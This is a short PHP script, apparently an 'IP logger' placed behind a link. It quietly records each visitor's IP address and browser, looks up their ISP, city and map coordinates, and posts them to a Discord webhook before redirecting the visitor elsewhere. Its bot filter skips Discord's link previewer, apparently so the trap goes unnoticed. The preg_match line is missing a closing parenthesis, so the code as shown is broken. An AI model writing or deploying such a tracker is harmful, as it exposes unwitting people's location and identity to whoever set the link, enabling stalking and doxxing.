<?php
/*
  Get IP
*/
$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

/*
  Stop us from picking up bot ips
*/
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser) exit();

/*
  Info
*/
//Get the info of the IP using Curl
$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

/*
   Coordinates
*/
$COORD = "$Info->lat, $Info->lon";

/*
  Variables 
*/
//Webhook here.
$Webhook    = "";

//This will be the name of the webhook when it sends a message.  
$WebhookTag = "Showcase";

/*
  JS we are going to send to the webhook.
*/
$JS = json_encode(array(
    'username'   => "$WebhookTag - IP Logger" , 
    'avatar_url' => "https://vgy.me/GQe9bJ.png",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $Info->isp\nBrowser: $Browser\n**__Location__**: \nCountry: $Info->country\nRegion: $Info->regionName\nCity: $Info->city\nCoordinates: $COORD"
));
 

function IpToWebhook($Hook, $Content)
{
    //Use Curl to post to the webhook.
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook($Webhook, $JS);
header("Location: https://www.littest.site");
